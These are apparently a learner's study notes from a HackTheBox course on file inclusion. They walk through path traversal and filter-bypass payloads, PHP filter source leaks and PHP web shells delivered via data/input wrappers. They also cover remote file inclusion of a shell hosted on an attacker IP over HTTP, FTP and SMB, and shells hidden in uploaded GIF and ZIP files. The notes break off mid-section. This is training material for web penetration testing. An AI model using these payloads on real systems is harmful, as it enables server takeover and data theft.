
# HTB: File Inclusion Module Summary

****

In this module, we will cover:

- An intro to file inclusion vulnerabilities
- Local File Inclusion (LFI)
- Path Traversal
- Bypassing basic LFI restrictions
- LFI to remote code execution (RCE)
    - RCE through PHP wrappers
    - RCE through Remote File Inclusion (RFI)
    - RCE through malicious file uploads
    - RCE through log poisoning
- Automating LFI exploitation
- Preventing LFI exploitation

- https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- [**Testing for Local File Inclusion**](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)

## Intro to LFI

[File Inclusion vulnerabilities](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) occur when a web application uses user-controllable parameters (like HTTP GET parameters) to specify which files are loaded or rendered on a page. This typically happens in **templating engines** used to maintain a consistent look (headers/footers) while dynamically swapping content. This is why we often see a parameter like `/index.php?page=about`, where `index.php` sets static content (e.g. header/footer), and then only pulls the 
dynamic content specified in the parameter, which in this case may be read from a file called `about.php`

---

**Key Concepts**

- **Local File Inclusion (LFI):** An attacker manipulates parameters to view local files on the hosting server (e.g., `/etc/passwd`).
- **Risks:** * **Source Code Disclosure:** Exposure of application logic and potential secrets.
    - **Sensitive Data Exposure:** Leaking credentials, database keys, or configuration files.
    - **Remote Code Execution (RCE):** Under specific conditions, an attacker can execute malicious scripts on the server.

---

**Language-Specific Examples:** 

- **PHP:** In `PHP`, we may use the `include()` function to load a local or a remote file as we load a page. If the `path` passed to the `include()` is taken from a user-controlled parameter, like a `GET` parameter, and `the code does not explicitly filter and sanitize the user input`, then the code becomes vulnerable to File Inclusion. The following code snippet shows an example of that:
    
    ```php
    if (isset($_GET['language'])) {
        include($_GET['language']);
    }
    ```
    
- **Note:** In this module, we will mostly focus on PHP web applications running on a Linux back-end server. However, most techniques and attacks would work on the majority of other frameworks, so our examples would be the same with a web application written in any other language.
- **NodeJS:** Just as the case with PHP, NodeJS web servers may also load content based on an HTTP parameters. The following is a basic example of how a GET parameter `language` is used to control what data is written to a page:
    
    ```jsx
    if(req.query.language) {
        fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
            res.write(data);
        });
    }
    ```
    
- **Express.js** framework.
    
    ```jsx
    app.get("/about/:language", function(req, res) {
        res.render(`/${req.params.language}/about.html`);
    });
    ```
    
- **Java**:
    
    ```java
    <c:if test="${not empty param.language}">
        <jsp:include file="<%= request.getParameter('language') %>" />
    </c:if>
    ```
    
- **.NET:** The `Response.WriteFile` function works very similarly to all of our earlier examples, as it takes a file path as input and writes its contents to the response. The path may be retrieved from a GET parameter for dynamic content loading, as follows:
    
    ```vbnet
    @if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
        <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
    }
    ```
    

---

**Read vs. Execute:** It is crucial to distinguish between functions that simply **read** a file and those that **execute** it:

- **Read-only:** Functions like `file_get_contents()` or `fs.readFile()` display the raw source code. This is dangerous for data theft but doesn't run code directly.
- **Execute:** Functions like PHP's `include()` or .NET's `include` will execute any code found within the file. If an attacker can upload a malicious file or point to a remote URL, they can gain full control of the server.

The following table shows which functions may execute files and which only read file content:

| **Function** | **Read Content** | **Execute** | **Remote URL** |
| --- | --- | --- | --- |
| **PHP** |  |  |  |
| `include()`/`include_once()` | ✅ | ✅ | ✅ |
| `require()`/`require_once()` | ✅ | ✅ | ❌ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()`/`file()` | ✅ | ❌ | ❌ |
| **NodeJS** |  |  |  |
| `fs.readFile()` | ✅ | ❌ | ❌ |
| `fs.sendFile()` | ✅ | ❌ | ❌ |
| `res.render()` | ✅ | ✅ | ❌ |
| **Java** |  |  |  |
| `include` | ✅ | ❌ | ❌ |
| `import` | ✅ | ✅ | ✅ |
| **.NET** |  |  |  |
| `@Html.Partial()` | ✅ | ❌ | ❌ |
| `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| `Response.WriteFile()` | ✅ | ❌ | ❌ |
| `include` | ✅ | ✅ | ✅ |

This is a significant difference to note, as executing files may allow us to execute functions and eventually lead to code execution, while only reading the file's content would only let us to read the 
source code without code execution. Furthermore, if we had access to the source code in a whitebox exercise or in a code audit, knowing these actions helps us in identifying potential File Inclusion vulnerabilities, especially if they had user-controlled input going into them.

## **File Disclosure**

### Local File Inclusion

1. **Basic LFI**

The exercise we have at the end of this section shows us an example of a web app that allows users to set their language to either English or Spanish:

![Webpage showing 'Inlane Freight' with a language dropdown menu open, displaying options for 'English' and 'Spanish'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/basic_lfi_lang.png)

If we select a language by clicking on it (e.g. `Spanish`), we see that the content text changes to spanish:

![Shipping containers stacked at a port with cranes in the background, illustrating the history and industry of container shipping.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/basic_lfi_es.png)

We also notice that the URL includes a `language` parameter that is now set to the language we selected (`es.php`). There are several ways the content could be changed to match the 
language we specified. 

- pulling the content from a different database table based on the specified parameter,
- or loading an entirely different version of the web app.

However, as previously discussed, loading part of the page using template engines is the 
easiest and most common method utilized.

Now lets test if we can pull the content on a different local file

```vbnet
/index.php?language=../../../../etc/passwd 
```

![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/1.png)

---

1. Path Traversal

We can read a file by specifying its `absolute path` (e.g. `/etc/passwd`) only if the whole input was used within the `include()` function without any additions, like the following example:

```php
include($_GET['language']);
```

In this case, if we try to read `/etc/passwd`, then the `include()` function would fetch that file directly. However, in many occasions, web developers may append or prepend a string to the `language` parameter. For example, the `language` parameter may be used for the filename, and may be added after a directory, as follows:

```php
include("./languages/" . $_GET['language']);
```

In this case, if we attempt to read `/etc/passwd`, then the path passed to `include()` would be (`./languages//etc/passwd`), and as this file does not exist, we will not be able to read anything:

![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/2.png)


We can easily bypass this restriction by traversing directories using `relative paths`.For example, with `/var/www/html/` we are `3` directories away from the root path, so we can use `../` 3 times (i.e. `../../../`).

---

1. **Filename Prefix**:

our input may be appended after a different string.For example, it may be used with a prefix to get the full filename, like the following example:

```php
include("lang_" . $_GET['language']);
```

If we request the `en.php` file it will be → `lang_en.php`  . This is bypassed by prefixing a `/` before our payload, and this should consider the prefix as a directory, and then we should bypass the filename and be able to traverse directories:

```bash
/../../../../etc/passwd
```

- **Note:** This may not always work, as in this example a directory named `lang_/` may not exist, so our relative path may not be correct. Furthermore, `any prefix appended to our input may break some file inclusion techniques` we will discuss in upcoming sections, like using PHP wrappers and filters or RFI.

---

1. **Appended Extensions**

Another very common example is when an extension is appended to the `language` parameter, as follows:

```php
include($_GET['language'] . ".php");
```

This is quite common, as in this case, we would not have to write the extension every time we need to change the language. This may also be safer as it may restrict us to only including PHP files. In this case, if we try to read `/etc/passwd`, then the file included would be `/etc/passwd.php`

---

1. **Second-Order Attack** 

A **Second-Order Attack** is a more sophisticated form of File Inclusion where the malicious payload is not delivered directly through a URL parameter, but is instead "stored" by the application and executed later by a different function.

**Key Characteristics**

- **Delayed Execution:** Unlike a standard LFI where the attack happens immediately upon clicking a link, a second-order attack involves two steps: **Poisoning** and **Execution**.
- **Trust in Databases:** Developers often sanitize direct user input (like search bars) but may "trust" data coming from their own database, assuming it is already safe.
- **Persistence:** The payload remains in the system (e.g., in a user profile) until the vulnerable function retrieves it.

**How the Attack Works**

1. **Step 1 (Poisoning):** The attacker submits a malicious payload as a piece of information the web app saves—such as a username, a profile description, or a file name.
    - *Example payload:* `../../../etc/passwd`
2. **Step 2 (Triggering):** The attacker interacts with a different part of the site that calls upon that stored data to fetch a file.
3. **Step 3 (Exploitation):** The back-end server pulls the "poisoned" string from the database and uses it in a file-loading function, unintentionally serving a sensitive system file.

**Examples of Second-Order Scenarios**

**1. The Avatar Download:** 

- An application allows users to download their profile picture via a URL like:
`https://example.com/download_avatar.php?user=victor`
- Behind the scenes, the code might look like this:
    
    ```php
    $user = get_username_from_db(); // Returns "../../../etc/passwd"
    include("/var/www/uploads/avatars/" . $user . ".png");
    ```
    

Because the developer trusted the username stored in the database, the attacker successfully traverses out of the avatar folder to read the system password file.

**2. Web Logs or Error Reporting**

- An attacker might set their "User-Agent" or "Language" preference to an LFI payload.
- If an admin panel later generates a report or a PDF summary by "including" files based on those stored user preferences, the attack triggers when the admin views that report.

### **Basic Bypasses**

In the previous section, we saw several types of attacks that we can use for different types of LFI vulnerabilities. In many cases, we may be facing a web application that applies various protections against file inclusion, so our normal LFI payloads would not work. Still, unless the web application is properly secured against malicious LFI user input, we may be able to bypass the protections in place and reach file inclusion.

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#local-file-inclusion
- https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt

---

1. **Non-Recursive Path Traversal Filters**

One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (`../`) to avoid path traversals. For example:

```php
$language = str_replace('../', '', $_GET['language']);
```

So if we try `../../../../etc/passwd`it will be → `./languages/etc/passwd`. However, this filter is very insecure, as it is not `recursively removing` the `../` substring, as it runs a single time on the input string and does not apply the filter on the output string. For example, if we use `....//` as our payload, then the filter would remove `../` and the output string would be `../`, which means we may still perform path traversal. 

```bash
languages/....//....//....//....//etc/passwd
languages/..././..././..././..././/etc/passwd    
....\/                                           # use of escap character. But it didnt work on this example 
languages/....//....//....//....//etc/passwd    # adding extra slashes
languages/....///////....////....////....//////etc/passwd 
```

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/3.png)


---

1. **Encoding**

Some web filters may prevent input filters that include certain LFI-related characters, like a dot `.` or a slash `/` used for path traversals. However, some of these filters may be bypassed by URL encoding our input. Core PHP filters on versions 5.3.4 and earlier were specifically vulnerable to this bypass, but even on newer versions we may find custom filters that may be bypassed through URL encoding.

```bash
# test-1: didnt work
languages/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
languages/../../../../etc/passwd

# test-3: worked
%6c%61%6e%67%75%61%67%65%73%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%65%74%63%2f%70%61%73%73%77%64
languages/....//....//....//....//etc/passwd 
```

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/4.png)

---

1. Approved Paths

Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. For example, the web application we have been dealing with may only accept paths that are under the `./languages` directory, as follows:

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

we already identified the approved path from the request:

```bash
GET /index.php?language=languages/en.php
```

But in some cases, we may need to fuzz the web directories under the same path to identify so we can start path traversal with the approved path like this:

```bash
/index.php?language=./languages/../../../../etc/passwd
```

Some web applications may apply this filter along with one of the earlier filters, so we may combine both techniques by starting our payload with the approved path, and then URL encode our payload or use recursive payload.

```bash
languages/....//....//....//....//etc/passwd
languages/..././..././..././..././/etc/passwd 
languages/....//....//....//....//etc/passwd
%6c%61%6e%67%75%61%67%65%73%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%65%74%63%2f%70%61%73%73%77%64
```

- **Note:** All techniques mentioned so far should work with any LFI vulnerability, regardless of the back-end development language or framework.

---

1. **Appended Extension**

As discussed in the previous section, some web applications append an extension to our input string (e.g. `.php`), to ensure that the file we include is in the expected extension. With 
modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful, as we will see in the next section (e.g. for reading source code).

```bash
<?php
$page = $_GET['page'];
include($page . ".php");
?>
```

There are a couple of other techniques we may use, but they are `obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4`. However, it may still be beneficial to mention them, as some web applications may still be running on older servers, and these techniques may be the only bypasses possible.

- Check this [source](https://medium.com/@SKaif009/%EF%B8%8F-beyond-etc-passwd-lfi-bypass-the-ultimate-guide-5829d1efb600) or [this](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) for Bypassing technique

---

1. **Path Truncation**

In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be `truncated`, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so: 

- `/etc/passwd/.` the `/.`  will be truncated and PHP would call → `/etc/passwd`
- same for `////etc/passwd` in Linux and PHP it would be → `/etc/passwd`
- `/etc/./passwd` the `.` will be truncated → `/etc/passwd`

If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (`.php`) would be truncated (removed), and we would have a path without an appended 
extension. **Finally, it is also important to note that we would also need to `start the path with a non-existing directory` for this technique to work.**

An example of such payload would be the following:

```
?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
```

automate the appending of `./` 2048 times with this script

```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

We may also increase the count of `../`, as adding more would still land us in the root directory, as explained in the previous section. However, if we use this method, we should calculate the full 
length of the string to ensure only `.php` gets truncated and not our requested file at the end of the string (`/etc/passwd`)

---

1. **Null Bytes**

PHP versions before 5.5 were vulnerable to `null byte injection`, which means that adding a null byte (`%00`) at the end of the string would terminate the string and not consider anything after it. This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.

To exploit this vulnerability, we can end our payload with a null byte

```bash
../../../etc/passwd%00
```

 such that the final path passed to `include()` would be (`/etc/passwd%00.php`). This way, even though `.php` is appended to our string, anything after the null byte would be truncated, and so the path used would actually be `/etc/passwd`, leading us to bypass the appended extension

---

### PHP Filters

Many popular web applications are developed in PHP, along with various custom web applications built with different PHP frameworks, like Laravel or Symfony. If we identify an LFI vulnerability in PHP web applications, then we can utilize different [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) to be able to extend our LFI exploitation, and even potentially reach remote code execution.

PHP Wrappers allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams. This has a lot of uses for PHP developers. Still, as web penetration testers, we can utilize these wrappers to extend our exploitation attacks and be able to read PHP source code files or even execute system commands. This is not only beneficial with LFI attacks, but also with other web attacks like XXE, as covered in the [Web Attacks](https://academy.hackthebox.com/module/details/134) module.

---

1. **Input FIlter** 

[PHP Filters](https://www.php.net/manual/en/filters.php) are a type of PHP wrapper, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the `php://` scheme in our string, and we can access the PHP filter wrapper with `php://filter/`. The `filter` wrapper has several parameters, but the main ones we require for our attack are `resource` and `read`

- The `resource` parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file)
- while the `read` parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.

There are four different types of filters available for use, which are 

- [String Filters](https://www.php.net/manual/en/filters.string.php)
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)

the filter that is useful for LFI attacks is the `convert.base64-encode` filter, under `Conversion Filters`.

**How Developers Use PHP Filters:**  Developers use the `php://filter` wrapper to process file content before it reaches the application logic.

**Common syntax:** `php://filter/[FILTER_TYPE]/resource=[FILE]`

- **Encoding:** Converting data to Base64 to handle binary data or prevent it from being rendered by the browser.
- **Conversion:** Changing character sets (e.g., from Latin-1 to UTF-8).
- **Compression:** Zipping or unzipping data on the fly using `zlib`.

**Example of legitimate use:**

```php
// Reading a file and ensuring it is encoded to avoid breaking the HTML layout
echo file_get_contents("php://filter/read=convert.base64-encode/resource=config.php");
```

**How Attackers Exploit PHP Filters for LFI:** When a web application is vulnerable to LFI (e.g., `include($_GET['page'])`), an attacker can use filters to overcome common obstacles.

**A. Bypassing Execution (Source Code Leaking):** If an attacker tries to read `config.php` using a standard LFI, the server will **execute** the PHP code inside. The attacker won't see the code; they will only see the result (usually a blank page).

By using the **Base64 filter**, the attacker forces the server to encode the file into a string *before* it is processed. Since the string is now Base64, the PHP engine cannot execute it, and it is printed directly to the screen.

- **The Payload:** `php://filter/convert.base64-encode/resource=config.php`
- **The Result:** The attacker receives a Base64 string. They decode it locally to see the cleartext database passwords and logic.

**B. Filter Chains (Remote Code Execution):** A more advanced exploitation technique involves **PHP Filter Chains**. Attackers can stack multiple conversion filters to "type" characters into the server's memory. By carefully choosing a sequence of filters (like `convert.iconv.*`), they can transform any file's content into a functional PHP web shell without ever uploading a file.

Example: 

The web application append `.php` at the end of the file, 

```php
$file = $_GET['page'];
include($file . ".php");
```

using the `php://filter` wrapper we can encode and display the the content of any `php` files

```bash
/index.php?language=php://filter/convert.base64-encode/resource=index

# or
/index.php?language=php://filter/read=convert.base64-encode/resource=index
```

result:  

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/5.png)


This is the index.php file: (removed the html part)

```php
<!DOCTYPE html>
<?php
if (isset($_GET['language'])) {
    $lang = $_GET['language'];
} else {
    $lang = "en";
}
?>
....
        </div>
        <div class="description">
            <h1>History</h1>
            <h2>Containers</h2>
            <?php
            include($lang . ".php");
            echo $p2;
            ?>
    ...
```

---

1. **Fuzzing for PHP Files**

If we only can view the php files, then fuzz the target for hidden php files 

```bash
$ ffuf -u "http://154.57.164.65:30862/FUZZ" -w /usr/share/wordlists/dirb/common.txt  -e .php -fc 404 -s     

configure.php
en.php
es.php
index.php
server-status
```

> **Tip:** Unlike normal web application usage, we are not restricted to pages with HTTP response code `200`, as we have local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403`(forbidden)pages, and we should be able to read their source code as 
well.
> 

view the configuration file : 

```php
/index.php?language=php://filter/convert.base64-encode/resource=configure
```

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/6.png)

## **Remote Code Execution**

### PHP Wrappers

From this section, we will start learning how we can use file inclusion vulnerabilities to execute code on the back-end servers and gain control over them. 

 One easy and common method for gaining control over the back-end server is by enumerating user credentials and SSH keys:

- SSH Keys found in each user’s home directory `.ssh` and if the read privileges are not set properly, then we may be able to grab their private key (`id_rsa`) and use it to SSH into the system.
- Second is reading the `configuration.php` file as we did in the previous section which will contains the database credentials

Other than such trivial methods, there are ways to achieve **remote code execution** directly through the vulnerable function without relying on data enumeration or local file privileges. In this section, we will start with remote code execution on PHP web applications by utilizing different `PHP wrappers`

```bash
/index.php?language=php://filter/read=convert.base64-encode/resource=index.php
```

Before starting the exploitation, this is the `index.php` file for this section exercise: (I removed the html parts ) 

```bash
...
<?php
if (isset($_REQUEST['language'])) {
    $lang = $_REQUEST['language'];
} else {
    $lang = "en.php";
}
?>
....
           <?php
            include($lang);
            echo $p2;
            ?>
```

---

1. **The [DATA](https://www.php.net/manual/en/wrappers.data.php) Wrapper** 

The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code but only if the `allow_url_include`settings were enabled in the PHP configurations. We can read PHP configuration using the PHP filter:

- The PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache
- or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx

Where `X.Y` is your install PHP version and `.ini` files are similar to `.php`so we need to encode them to avoid breaking

```bash
index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```

I used `curl` because the file was too long

```bash
$ curl -s "http://154.57.164.81:30765/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" -O index.php

$ grep -oP '[A-Za-z0-9+/]{40,}=*' index.php| base64 -d > decode.init 
```

check now if `allow_url_include`

```bash
$ grep -C 2 "allow_url_include" decode.ini
; Whether to allow include/require to open URLs (like http:// or ftp://) as files.
; http://php.net/allow-url-include
allow_url_include = On
```

Enabling this option allows us not only to use `data` wrapper, but also the `input` wrapper

### **Remote Code Execution via PHP Wrappers**

---

1. **DATA Wrapper** 

with the `allow_url_include` enabled we can use `data` wrapper, which will be used to include external data, including PHP code. we can encode the external data and it will decode and execute it automatically. **The data wrapper usage:**

```bash
data://text/plain;base64
```

Lets encode simple php script 

```bash
$ echo '<?php system($_GET["cmd"]); ?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`:

```bash
/index.php?language=data%3a//text/plain%3bbase64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2bCg%3d%3d&cmd=id 
```

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/7.png)


---

1. [**input](https://www.php.net/manual/en/wrappers.php.php) wrapper**

Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code. The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data.So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the `input` wrapper also depends on the `allow_url_include` setting, as mentioned earlier.

```bash
/index.php?language=PHP://input&cmd=id

<?php system($_GET["cmd"]); ?>
```

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/8.png)

**Note:** To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)

```bash
POST /index.php?language=PHP://input

<?php system('id')?>
```

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/9.png)

---

1. [**expect](https://www.php.net/manual/en/wrappers.expect.php) Wrapper**

Finally, we may utilize the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to directly run commands through URL streams. However, `expect` is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality. We can check whether it is configured to load on the back-end server

```bash
$ grep -C 2 expect decode.ini

extension=expect
```

As we can see, the `extension=expect` directive is present in the configuration, which indicates the server is configured to attempt to load the `expect` extension.

```bash
/index.php?language=expect://id
```

This wrapper didn't work for some reason

### Remote File Inclusion

In some cases, we may also be able to include remote files "[Remote File Inclusion (RFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)", if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:

1. Enumerating local-only ports and web applications (i.e. SSRF)
2. Gaining remote code execution by including a malicious script that we host

In this section, we will cover how to gain remote code execution through RFI vulnerabilities.

**Here are some of  the functions that (if vulnerable) would allow RFI:**

| **Function** | **Read Content** | **Execute** | **Remote URL** |
| --- | --- | --- | --- |
| **PHP** |  |  |  |
| `include()`/`include_once()` | ✅ | ✅ | ✅ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| **Java** |  |  |  |
| `import` | ✅ | ✅ | ✅ |
| **.NET** |  |  |  |
| `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| `include` | ✅ | ✅ | ✅ |

As we can see, almost any RFI vulnerability is also an LFI vulnerability, as any function that allows including remote URLs usually also allows including local ones. However, an LFI may not necessarily be an RFI. **This is primarily because of three reasons:**

1. The vulnerable function may not allow including remote URLs
2. You may only control a portion of the filename and not the entire protocol wrapper (ex: `http://`, `ftp://`, `https://`).
3. The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.

---

1. **Verify RFI**

Remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled, and we confirmed previously that this option is enabled. 

```bash
allow_url_include = On 
```

However, this may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with. So to confirm if the function is vulnerable, try tp include URL. 

```bash
GET /index.php?language=http://127.0.0.1:80/index.php
```

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/10.png)

As you can see, the `index.php` got executed and included and it is using the `include()` function

```php
<?php
include($lang);
echo $p2;
?>
```

and this function `Read`,`Execute` and also allows `Remote URL`

---

1. **Remote Code Execution with RFI (HTTP Schema)**

we confirmed the vulnerability now, let's write a simple PHP web shell and host it on our machine

```bash
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

host a web server running on port 80 

```bash
$ python3 -m http.server 80
```

include our local shell through RFI 

```bash
GET /index.php?language=http://<OUR-IP>:80/shell.php&cmd=id
```

We added the `cmd` parameter because our `shell.php` will be included and executed automatically, and when that happens, it will execute the commands specified on the `cmd` parameter

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/11.png)

- **Tip:** We can examine the connection on our machine to ensure the request is being sent as we specified it. For example, if we saw an extra extension (.php) was appended to the request, then we can omit it from our payload

---

1. **Remote Code Execution with RFI (FTP Schema)**

As mentioned earlier, we may also host our script through the FTP protocol. We can start a basic FTP server with Python's `pyftpdlib`, as follows:

```bash
$ sudo python -m pyftpdlib -p 21
```

This may also be useful in case http ports are blocked by a firewall or the `http://` string gets blocked by a WAF. To include our script, use the `ftp://` scheme in the URL, as follows:

```bash
/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id

```

By default, PHP tries **to authenticate as an anonymous user**. If the server requires valid authentication, then the credentials can be specified in the URL, as follows:

```bash
$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

---

1. **Remote Code Execution with RFI ( SMB)**

If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.

We can spin up an SMB server using `Impacket's smbserver.py`, which allows anonymous authentication by default, as follows:

```bash
$ impacket-smbserver -smb2support share $(pwd)
```

Now, we can include our script by using a UNC path (e.g. `\\<OUR_IP>\share\shell.php`), and specify the command with (`&cmd=whoami`) as we did earlier:

```bash
/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

As we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled. However, we must note that this technique is `more likely to work if we were on the same network`, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.

---

### **LFI and File Uploads**

If the back-end can store and execute the stored files then we can exploit it to test for LFI via File Uploa. The [File Upload Attacks](https://academy.hackthebox.com/module/details/136) module covers different techniques on how to exploit file upload forms and functionalities. 

**The difference between File Upload Attacks and LFI via File Uploads** is that we do not require the file upload form to be vulnerable, but merely allow us to upload files.If the vulnerable function has code `Execute` capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type

For example, we can upload an image file (e.g. `image.jpg`), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution. 

- Refer to **Intro to LFI** to view the list of functions that can read, and execute capability.

---

1. **Image Upload**

Craft a malicious image containing a PHP script and include image magic bytes at the beginning, just in case if the upload form checks for extension and content type. 

```bash
$ echo 'GIF8<?php system($_GET["cmd"]);?>' > shell.gif              
                                                                                
# the file command checks the file type from the file signature
$ file shell.gif            
shell.gif: GIF image data 26736 x 8304
```

- **Note:** We are using a `GIF` image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type. The [File Upload Attacks](https://academy.hackthebox.com/module/details/136) module goes more in depth for file type attacks, and the same logic can be applied here.
    
    

Upload the image: 

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/12.png)

To see where the images are uploaded to, view the source code: 

```html
<form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm"
                style="height: 200px; width: 150px;">
                <input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)"
                    accept=".jpg,.jpeg,.png,.gif,.zip">
                <img src='/profile_images/default.jpg' class='profile-image' id='profile-image'>
                <input type="submit" value="Upload" id="submit">
            </form>
```

- **Note:** As we can see, we can use `/profile_images/shell.gif` for the file path. If we do not know where the file is uploaded, then we can fuzz for an uploads directory, and then fuzz for our uploaded file, though this may not always work as some web applications properly hide 
the uploaded files.

Now that we know the files are uploaded to, **use the Local File Inclusion functionality on the target website such as when it includes a php file based on the selected language** `\languages=en.php`

```html
/index.php?language=./profile_images/shell.gif&cmd=id 
```

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/13.png)

- **Note:** To include to our uploaded file, we used `./profile_images/` as in this case the LFI vulnerability does not prefix any directories before our input. In case it did prefix a directory before our input, then we simply need to `../` out of that directory and then use our URL path, as we learned in previous sections.

---

1. **ZIP Upload**

We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. However, this wrapper isn't enabled by 
default, so this method may not always work. To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named `shell.jpg`), as follows:

```bash
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

$ file shell.jpg     
shell.jpg: Zip archive data, made by v3.0 UNIX, extract using at least v1.0, last modified Feb 10 2026 14:22:00, uncompressed size 31, method=store
                                                                                
# list the files inside the archive
$ unzip -l shell.jpg 
Archive:  shell.jpg
  Length      Date    Time    Name
---------  ---------- -----   ----
       31  2026-02-10 14:22   shell.php
---------                     -------
       31                     1 file

```

